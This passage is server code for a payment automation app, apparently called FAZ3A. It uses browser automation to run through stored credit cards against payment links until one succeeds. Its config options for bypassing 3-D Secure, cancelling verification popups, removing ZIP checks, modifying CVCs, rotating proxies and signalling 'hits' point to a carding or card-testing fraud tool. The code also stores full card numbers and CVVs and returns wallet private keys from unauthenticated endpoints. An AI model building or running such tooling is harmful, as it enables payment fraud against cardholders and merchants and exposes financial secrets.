      let finalMethods = availablePaymentMethods.length > 0 
        ? availablePaymentMethods 
        : (payload.availablePaymentMethods || []);
      
      const allMethods = new Set(finalMethods);
      payload.availablePaymentMethods = Array.from(allMethods);

      res.json(payload);
    } catch (error: any) {
      console.error("Link Analysis Error:", error.message);
      res.status(500).json({ error: "Failed to analyze link", details: error.message });
    }
  });

  // ─── Execute Payment ──────────────────────────────────────────────

  app.post("/api/execute-payment", async (req, res) => {
    try {
      const { paymentDetails, paymentMethod, cardDetails, link } = req.body;
      if (!paymentDetails || !paymentMethod) {
        return res.status(400).json({ error: "Missing required payment details" });
      }

      const transactionId = "TXN-" + uuidv4().substring(0, 8).toUpperCase();

      const newTx: Transaction = {
        id: transactionId,
        vendor: paymentDetails.vendor || "Unknown",
        amount: Number(paymentDetails.amount) || 0,
        currency: paymentDetails.currency || "USD",
        gateway: paymentDetails.gateway || "Unknown",
        status: "processing",
        timestamp: new Date().toISOString(),
        paymentMethod,
        riskScore: paymentDetails.riskScore || "Medium",
        description: paymentDetails.description || "",
        link: link || paymentDetails.link || "",
        stages: [],
      };

      addStage(newTx, "Transaction created and queued");
      db.transactions.unshift(newTx);
      broadcast("payment_update", newTx);

      // Return immediate response
      res.json({
        success: true,
        transactionId,
        message: "Payment agent deployed. Browser automation started.",
      });

      // Determine which cards to try
      let cardsToTry: Array<{ number: string; name: string; expiry: string; cvv: string; zip?: string }> = [];

      if (cardDetails && cardDetails.number) {
        // User provided card details directly
        cardsToTry.push({
          number: cardDetails.number,
          name: cardDetails.name || cardDetails.cardholderName || "",
          expiry: cardDetails.expiry || "",
          cvv: cardDetails.cvv || "",
          zip: cardDetails.zip || cardDetails.postalCode || "",
        });
      }

      // If autofill enabled, add saved cards as fallbacks
      if (db.verificationConfig.enableAutofill) {
        const defaultCard = db.savedCards.find((c) => c.isDefault);
        const otherCards = db.savedCards.filter((c) => !c.isDefault);

        if (defaultCard && !cardsToTry.some((c) => c.number === defaultCard.fullNumber)) {
          cardsToTry.push({
            number: defaultCard.fullNumber,
            name: defaultCard.cardholderName,
            expiry: defaultCard.expiry,
            cvv: defaultCard.cvv,
          });
        }

        for (const card of otherCards) {
          if (!cardsToTry.some((c) => c.number === card.fullNumber)) {
            cardsToTry.push({
              number: card.fullNumber,
              name: card.cardholderName,
              expiry: card.expiry,
              cvv: card.cvv,
            });
          }
        }
      }

      if (cardsToTry.length === 0) {
        // No card available
        addStage(newTx, "No payment card available");
        newTx.status = "error";
        newTx.errorMessage = "No card details provided and no saved cards available";
        broadcast("payment_update", newTx);
        return;
      }

      // Background execution: try each card until one succeeds
      (async () => {
        let finalResult: Awaited<ReturnType<typeof executePaymentWithPuppeteer>> | null = null;

        try {
          for (let i = 0; i < cardsToTry.length; i++) {
            const card = cardsToTry[i];
            const cardLabel = `****${card.number.slice(-4)}`;
            addStage(newTx, `Attempting payment with card ${cardLabel} (${i + 1}/${cardsToTry.length})`);
            broadcast("payment_stage", {
              id: transactionId,
              stage: `Attempting with card ${cardLabel}...`,
            });
            newTx.cardUsed = cardLabel;

            const result = await executePaymentWithPuppeteer(newTx, card, db.verificationConfig);

            if (result.success) {
              finalResult = result;
              break;
            }

            // Card declined or errored — log and try next
            addStage(newTx, `Card ${cardLabel} result: ${result.status} — ${result.message}`);

            if (i < cardsToTry.length - 1) {
              addStage(newTx, `Retrying with next card...`);
              broadcast("payment_stage", {
                id: transactionId,
                stage: `Card ${cardLabel} ${result.status}. Trying next card...`,
              });
            } else {
              finalResult = result;
            }
          }
        } catch (execErr: any) {
          console.error("Puppeteer execution error:", execErr);
          addStage(newTx, `Execution error: ${execErr.message || 'Unknown error'}`);
          broadcast("payment_stage", {
            id: transactionId,
            stage: `Execution failed: ${execErr.message || 'Unknown error'}`,
          });
          finalResult = {
            success: false,
            status: "error" as const,
            message: `Execution error: ${execErr.message || 'Browser automation failed'}`,
          };
        }

        if (!finalResult) {
          finalResult = {
            success: false,
            status: "error" as const,
            message: "All payment attempts exhausted",
          };
        }

        // Update transaction with final result
        const txIndex = db.transactions.findIndex((t) => t.id === transactionId);
        if (txIndex !== -1) {
          if (finalResult.success) {
            db.transactions[txIndex].status = "success";
            db.processedAmount += db.transactions[txIndex].amount;
            addStage(db.transactions[txIndex], "Payment completed successfully");
          } else {
            db.transactions[txIndex].status = finalResult.status === "declined" ? "declined" : "failed";
            db.transactions[txIndex].errorMessage = finalResult.message;
            addStage(db.transactions[txIndex], `Payment ${finalResult.status}: ${finalResult.message}`);
          }

          db.transactions[txIndex].screenshotPath = finalResult.screenshotPath;
          db.transactions[txIndex].confirmationUrl = finalResult.confirmationUrl;
          db.transactions[txIndex].pageTransactionId = finalResult.pageTransactionId;
          db.transactions[txIndex].proof = {
            screenshotUrl: finalResult.screenshotPath ? `/screenshots/${path.basename(finalResult.screenshotPath)}` : undefined,
            confirmationUrl: finalResult.confirmationUrl,
            transactionId: finalResult.pageTransactionId,
          };

          broadcast("payment_update", db.transactions[txIndex]);

          if (finalResult.success) {
            broadcast("payment_complete", {
              id: transactionId,
              status: db.transactions[txIndex].status,
              amount: db.transactions[txIndex].amount,
              currency: db.transactions[txIndex].currency,
              vendor: db.transactions[txIndex].vendor,
              message: finalResult.message,
              screenshotPath: finalResult.screenshotPath,
              confirmationUrl: finalResult.confirmationUrl,
              pageTransactionId: finalResult.pageTransactionId,
              proof: db.transactions[txIndex].proof,
            });
          } else {
            broadcast(finalResult.status === "declined" ? "payment_declined" : "payment_error", {
              id: transactionId,
              status: db.transactions[txIndex].status,
              amount: db.transactions[txIndex].amount,
              currency: db.transactions[txIndex].currency,
              vendor: db.transactions[txIndex].vendor,
              errorDetails: finalResult.message,
              screenshotPath: finalResult.screenshotPath,
              confirmationUrl: finalResult.confirmationUrl,
              pageTransactionId: finalResult.pageTransactionId,
            });
          }
        }
      })().catch((err) => {
        console.error("Background payment execution error:", err);
        const txIndex = db.transactions.findIndex((t) => t.id === transactionId);
        if (txIndex !== -1) {
          db.transactions[txIndex].status = "failed";
          db.transactions[txIndex].errorMessage = err?.message || "Background execution crashed";
          addStage(db.transactions[txIndex], `Fatal error: ${err?.message || "Unknown error"}`);
          broadcast("payment_update", db.transactions[txIndex]);
          broadcast("payment_error", {
            id: transactionId,
            status: "failed",
            amount: db.transactions[txIndex].amount,
            currency: db.transactions[txIndex].currency,
            vendor: db.transactions[txIndex].vendor,
            errorDetails: err?.message || "Background execution crashed",
          });
        }
      });
    } catch (error: any) {
      console.error("Execute Payment Error:", error.message);
      res.status(500).json({ error: "Execution failed", details: error.message });
    }
  });

  // ─── Transaction Details ──────────────────────────────────────────

  app.get("/api/transactions/:id", (req, res) => {
    const tx = db.transactions.find((t) => t.id === req.params.id);
    if (!tx) {
      return res.status(404).json({ error: "Transaction not found" });
    }
    res.json(tx);
  });

  // ─── Saved Cards CRUD ─────────────────────────────────────────────

  app.get("/api/saved-cards", (_req, res) => {
    // Return cards with masked numbers
    const masked = db.savedCards.map((c) => ({
      id: c.id,
      last4: c.last4,
      brand: c.brand,
      cardholderName: c.cardholderName,
      expiry: c.expiry,
      nickname: c.nickname,
      isDefault: c.isDefault,
    }));
    res.json(masked);
  });

  app.post("/api/saved-cards", (req, res) => {
    const { cardNumber, cardholderName, expiry, cvv, nickname } = req.body;
    if (!cardNumber || !cardholderName || !expiry || !cvv) {
      return res.status(400).json({ error: "Card number, cardholder name, expiry, and CVV are required" });
    }

    const cleanNumber = cardNumber.replace(/\s+/g, "");
    const brand = detectCardBrand(cleanNumber);
    const last4 = cleanNumber.slice(-4);

    const newCard: SavedCard = {
      id: uuidv4(),
      last4,
      brand,
      cardholderName,
      expiry,
      nickname: nickname || `${brand} ****${last4}`,
      isDefault: db.savedCards.length === 0,
      fullNumber: cleanNumber,
      cvv,
    };

    db.savedCards.push(newCard);

    res.json({
      id: newCard.id,
      last4: newCard.last4,
      brand: newCard.brand,
      cardholderName: newCard.cardholderName,
      expiry: newCard.expiry,
      nickname: newCard.nickname,
      isDefault: newCard.isDefault,
    });
  });

  app.delete("/api/saved-cards/:id", (req, res) => {
    const idx = db.savedCards.findIndex((c) => c.id === req.params.id);
    if (idx === -1) {
      return res.status(404).json({ error: "Card not found" });
    }
    const wasDefault = db.savedCards[idx].isDefault;
    db.savedCards.splice(idx, 1);

    // If the deleted card was default and there are remaining cards, set first as default
    if (wasDefault && db.savedCards.length > 0) {
      db.savedCards[0].isDefault = true;
    }

    res.json({ success: true });
  });

  app.put("/api/saved-cards/:id/default", (req, res) => {
    const card = db.savedCards.find((c) => c.id === req.params.id);
    if (!card) {
      return res.status(404).json({ error: "Card not found" });
    }

    // Clear all defaults
    db.savedCards.forEach((c) => (c.isDefault = false));
    card.isDefault = true;

    res.json({ success: true, id: card.id });
  });

  // ─── Saved ACH CRUD ───────────────────────────────────────────────

  app.get("/api/saved-ach", (_req, res) => {
    const masked = db.savedACH.map((a) => ({
      id: a.id,
      routingNumber: a.routingNumber,
      accountLast4: a.accountLast4,
      bankName: a.bankName,
      accountType: a.accountType,
    }));
    res.json(masked);
  });

  app.post("/api/saved-ach", (req, res) => {
    const { routingNumber, accountNumber, bankName, accountType } = req.body;
    if (!routingNumber || !accountNumber || !bankName || !accountType) {
      return res.status(400).json({ error: "Routing number, account number, bank name, and account type are required" });
    }

    const newACH: SavedACH = {
      id: uuidv4(),
      routingNumber,
      accountLast4: accountNumber.slice(-4),
      bankName,
      accountType,
      fullAccountNumber: accountNumber,
    };

    db.savedACH.push(newACH);

    res.json({
      id: newACH.id,
      routingNumber: newACH.routingNumber,
      accountLast4: newACH.accountLast4,
      bankName: newACH.bankName,
      accountType: newACH.accountType,
    });
  });

  app.delete("/api/saved-ach/:id", (req, res) => {
    const idx = db.savedACH.findIndex((a) => a.id === req.params.id);
    if (idx === -1) {
      return res.status(404).json({ error: "ACH account not found" });
    }
    db.savedACH.splice(idx, 1);
    res.json({ success: true });
  });

  // ─── Crypto Wallets ───────────────────────────────────────────────

  app.post("/api/wallets/create", async (req, res) => {
    try {
      const { network } = req.body;
      const validNetworks = ["ETH", "BSC", "TRC20"];
      const selectedNetwork = validNetworks.includes(network) ? (network as "ETH" | "BSC" | "TRC20") : "ETH";

      // Generate real cryptographic wallet using ethers.js
      const wallet = ethers.Wallet.createRandom();

      const newWallet: CryptoWallet = {
        id: uuidv4(),
        network: selectedNetwork,
        address: wallet.address,
        privateKey: wallet.privateKey,
        balance: "0",
      };

      db.wallets.push(newWallet);

      res.json({
        id: newWallet.id,
        network: newWallet.network,
        address: newWallet.address,
        privateKey: newWallet.privateKey,
        balance: newWallet.balance,
      });
    } catch (error: any) {
      console.error("Wallet Creation Error:", error.message);
      res.status(500).json({ error: "Failed to create wallet", details: error.message });
    }
  });

  app.get("/api/wallets", (_req, res) => {
    res.json(
      db.wallets.map((w) => ({
        id: w.id,
        network: w.network,
        address: w.address,
        privateKey: w.privateKey,
        balance: w.balance,
      }))
    );
  });

  // ─── Verification Config ──────────────────────────────────────────

  app.get("/api/config/verification", (_req, res) => {
    res.json(db.verificationConfig);
  });

  app.post("/api/config/verification", (req, res) => {
    const config = req.body;
    if (!config || typeof config !== "object") {
      return res.status(400).json({ error: "Invalid configuration body" });
    }

    // Update only provided fields
    const allowedKeys: Array<keyof VerificationConfig> = [
      "cvcModifier",
      "removePaymentAgent",
      "bypass3D",
      "removeZipCode",
      "blockAnalytics",
      "hitSound",
      "hitScreenshot",
      "cancel3DPopup",
      "clickOnLoad",
      "clickOnLoadDelay",
      "clickerPath",
      "clickerInterval",
      "ignoreDisabled",
      "enableNotification",
      "dismissAfter",
      "proxyInterval",
      "enableAutofill",
      "delay",
      "timeout",
      "enableInterval",
      "interval",
    ];

    for (const key of allowedKeys) {
      if (key in config) {
        (db.verificationConfig as any)[key] = config[key];
      }
    }

    res.json(db.verificationConfig);
  });

  // ─── Vite Dev / Production Static ─────────────────────────────────

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: {
        middlewareMode: true,
        hmr: {
          server: server,
          path: "/vite-hmr",
        },
      },
      appType: "spa",
    });
    app.use(vite.middlewares);
    // Attach our WebSocket upgrade handler AFTER Vite is configured
    attachWSUpgrade();
  } else {
    // In production, attach immediately since there's no Vite
    attachWSUpgrade();
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (_req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  // ─── Start Server ─────────────────────────────────────────────────

  server.listen(PORT, "0.0.0.0", () => {
    console.log(`[FAZ3A] Server running on http://localhost:${PORT}`);
    console.log(`[FAZ3A] WebSocket available at ws://localhost:${PORT}/ws`);
    console.log(`[FAZ3A] SSE stream at http://localhost:${PORT}/api/stream`);
    console.log(`[FAZ3A] Mode: ${process.env.NODE_ENV || "development"}`);
  });
}

startServer().catch((err) => {
  console.error("Failed to start FAZ3A server:", err);
  process.exit(1);
});